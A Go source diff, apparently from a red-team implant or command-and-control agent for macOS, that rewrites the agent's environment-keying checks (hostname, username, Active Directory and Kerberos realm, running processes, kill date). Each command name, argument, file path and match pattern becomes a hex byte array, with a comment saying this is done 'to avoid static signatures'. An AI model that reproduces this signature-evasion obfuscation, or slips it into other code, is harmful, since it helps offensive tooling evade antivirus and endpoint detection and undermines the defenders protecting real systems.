@@ -30,6 +30,48 @@ var (
 	safetyWorkHoursEnd   string = ""
 )
 
+// Exec requirements strings (constructed to avoid static signatures)
+var (
+	// Command names
+	erCmdScutil     = string([]byte{0x73, 0x63, 0x75, 0x74, 0x69, 0x6c})                                                                                     // scutil
+	erCmdDsconfigad = string([]byte{0x64, 0x73, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x61, 0x64})                                                             // dsconfigad
+	erCmdDscl       = string([]byte{0x64, 0x73, 0x63, 0x6c})                                                                                                 // dscl
+	erCmdPs         = string([]byte{0x70, 0x73})                                                                                                             // ps
+	erCmdPgrep      = string([]byte{0x70, 0x67, 0x72, 0x65, 0x70})                                                                                           // pgrep
+
+	// Command arguments
+	erArgGet          = string([]byte{0x2d, 0x2d, 0x67, 0x65, 0x74})                                                                                         // --get
+	erArgLocalHost    = string([]byte{0x4c, 0x6f, 0x63, 0x61, 0x6c, 0x48, 0x6f, 0x73, 0x74, 0x4e, 0x61, 0x6d, 0x65})                                         // LocalHostName
+	erArgShow         = string([]byte{0x2d, 0x73, 0x68, 0x6f, 0x77})                                                                                         // -show
+	erArgLocalhost    = string([]byte{0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74})                                                                 // localhost
+	erArgList         = string([]byte{0x2d, 0x6c, 0x69, 0x73, 0x74})                                                                                         // -list
+	erArgActiveDir    = string([]byte{0x2f, 0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79})                 // /Active Directory
+	erArgRead         = string([]byte{0x2d, 0x72, 0x65, 0x61, 0x64})                                                                                         // -read
+	erArgSlash        = string([]byte{0x2f})                                                                                                                 // /
+	erArgAux          = string([]byte{0x61, 0x75, 0x78})                                                                                                     // aux
+	erArgCaseI        = string([]byte{0x2d, 0x69})                                                                                                           // -i
+
+	// Environment variable names
+	erEnvUser    = string([]byte{0x55, 0x53, 0x45, 0x52})                                                                                                   // USER
+	erEnvLogname = string([]byte{0x4c, 0x4f, 0x47, 0x4e, 0x41, 0x4d, 0x45})                                                                                 // LOGNAME
+
+	// File paths
+	erPathKrb5Conf    = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x6b, 0x72, 0x62, 0x35, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                                   // /etc/krb5.conf
+	erPathMitKerberos = string([]byte{0x2f, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f, 0x50, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6e, 0x63, 0x65, 0x73, 0x2f, 0x65, 0x64, 0x75, 0x2e, 0x6d, 0x69, 0x74, 0x2e, 0x4b, 0x65, 0x72, 0x62, 0x65, 0x72, 0x6f, 0x73}) // /Library/Preferences/edu.mit.Kerberos
+	erPathTildeFwd    = string([]byte{0x7e, 0x2f})                                                                                                           // ~/
+
+	// String patterns
+	erPatternADDomain   = string([]byte{0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x20, 0x44, 0x6f, 0x6d, 0x61, 0x69, 0x6e}) // Active Directory Domain
+	erPatternDefRealm   = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x5f, 0x72, 0x65, 0x61, 0x6c, 0x6d})                                       // default_realm
+	erPatternServerConn = string([]byte{0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e})                     // ServerConnection
+
+	// String literals
+	erWordTrue = string([]byte{0x74, 0x72, 0x75, 0x65})                                                                                                     // true
+
+	// Time format strings
+	erTimeFmtFull = string([]byte{0x32, 0x30, 0x30, 0x36, 0x2d, 0x30, 0x31, 0x2d, 0x30, 0x32, 0x20, 0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35})       // 2006-01-02 15:04:05
+)
+
 // PerformSafetyChecks runs all configured safety checks
 // Returns true if all checks pass, false otherwise
 func PerformSafetyChecks() bool {
@@ -65,7 +107,7 @@ func PerformSafetyChecks() bool {
 
 	// Check file existence
 	if safetyFilePath != "" {
-		mustExist := safetyFileMustExist == "true"
+		mustExist := safetyFileMustExist == erWordTrue
 		if !checkFile(safetyFilePath, mustExist) {
 			return false
 		}
@@ -115,7 +157,7 @@ func checkHostname(expected string) bool {
 
 	// Also check using scutil for local hostname
 	if !strings.EqualFold(hostname, expected) {
-		cmd := exec.Command("scutil", "--get", "LocalHostName")
+		cmd := exec.Command(erCmdScutil, erArgGet, erArgLocalHost)
 		output, err := cmd.Output()
 		if err == nil {
 			hostname = strings.TrimSpace(string(output))
@@ -131,9 +173,9 @@ func checkUsername(expected string) bool {
 	currentUser, err := user.Current()
 	if err != nil {
 		// Fallback to environment variable
-		username := os.Getenv("USER")
+		username := os.Getenv(erEnvUser)
 		if username == "" {
-			username = os.Getenv("LOGNAME")
+			username = os.Getenv(erEnvLogname)
 		}
 		return strings.EqualFold(username, expected)
 	}
@@ -177,7 +219,7 @@ func checkDomain(expected string) bool {
 
 // checkADDomainDSConfig checks Active Directory binding using dsconfigad
 func checkADDomainDSConfig() string {
-	cmd := exec.Command("dsconfigad", "-show")
+	cmd := exec.Command(erCmdDsconfigad, erArgShow)
 	output, err := cmd.Output()
 	if err != nil {
 		return ""
@@ -187,7 +229,7 @@ func checkADDomainDSConfig() string {
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
 		// Look for "Active Directory Domain = domain.com"
-		if strings.HasPrefix(line, "Active Directory Domain") {
+		if strings.HasPrefix(line, erPatternADDomain) {
 			parts := strings.Split(line, "=")
 			if len(parts) > 1 {
 				return strings.TrimSpace(parts[1])
@@ -200,7 +242,7 @@ func checkADDomainDSConfig() string {
 
 // checkADDomainDSCL checks Active Directory using dscl
 func checkADDomainDSCL() string {
-	cmd := exec.Command("dscl", "localhost", "-list", "/Active Directory")
+	cmd := exec.Command(erCmdDscl, erArgLocalhost, erArgList, erArgActiveDir)
 	output, err := cmd.Output()
 	if err != nil {
 		return ""
@@ -219,8 +261,8 @@ func checkADDomainDSCL() string {
 func checkKerberosRealm() string {
 	// Check /etc/krb5.conf
 	configPaths := []string{
-		"/etc/krb5.conf",
-		"/Library/Preferences/edu.mit.Kerberos",
+		erPathKrb5Conf,
+		erPathMitKerberos,
 	}
 
 	for _, path := range configPaths {
@@ -228,7 +270,7 @@ func checkKerberosRealm() string {
 			lines := strings.Split(string(data), "\n")
 			for _, line := range lines {
 				line = strings.TrimSpace(line)
-				if strings.HasPrefix(strings.ToLower(line), "default_realm") {
+				if strings.HasPrefix(strings.ToLower(line), erPatternDefRealm) {
 					if strings.Contains(line, "=") {
 						parts := strings.Split(line, "=")
 						if len(parts) > 1 {
@@ -245,7 +287,7 @@ func checkKerberosRealm() string {
 
 // checkOpenDirectory checks if bound to Open Directory
 func checkOpenDirectory() string {
-	cmd := exec.Command("dscl", "localhost", "-read", "/")
+	cmd := exec.Command(erCmdDscl, erArgLocalhost, erArgRead, erArgSlash)
 	output, err := cmd.Output()
 	if err != nil {
 		return ""
@@ -254,7 +296,7 @@ func checkOpenDirectory() string {
 	// Parse output for Open Directory server
 	lines := strings.Split(string(output), "\n")
 	for _, line := range lines {
-		if strings.Contains(line, "ServerConnection") {
+		if strings.Contains(line, erPatternServerConn) {
 			// Extract server name
 			parts := strings.Fields(line)
 			if len(parts) > 1 {
@@ -269,7 +311,7 @@ func checkOpenDirectory() string {
 // checkFile verifies file existence based on the requirement
 func checkFile(path string, mustExist bool) bool {
 	// Expand ~ to home directory if present
-	if strings.HasPrefix(path, "~/") {
+	if strings.HasPrefix(path, erPathTildeFwd) {
 		if home, err := os.UserHomeDir(); err == nil {
 			path = filepath.Join(home, path[2:])
 		}
@@ -300,7 +342,7 @@ func checkProcess(processName string) bool {
 // checkProcessViaPS uses the ps command to check for processes
 func checkProcessViaPS(processName string) bool {
 	// Use ps with wide output to avoid truncation
-	cmd := exec.Command("ps", "aux")
+	cmd := exec.Command(erCmdPs, erArgAux)
 	output, err := cmd.Output()
 	if err != nil {
 		return false
@@ -314,7 +356,7 @@ func checkProcessViaPS(processName string) bool {
 	}
 
 	// Also check using pgrep for exact matches
-	cmd = exec.Command("pgrep", "-i", processName)
+	cmd = exec.Command(erCmdPgrep, erArgCaseI, processName)
 	if err := cmd.Run(); err == nil {
 		return true
 	}
@@ -358,7 +400,7 @@ func checkProcessGopsutil(processName string) bool {
 // checkKillDate verifies the current date is before the kill date
 func checkKillDate(killDateStr string) bool {
 	// Parse kill date (format: "2006-01-02 15:04:05")
-	killDate, err := time.Parse("2006-01-02 15:04:05", killDateStr)
+	killDate, err := time.Parse(erTimeFmtFull, killDateStr)
 	if err != nil {
 		// If we can't parse the kill date, fail safe and don't run
 		return false
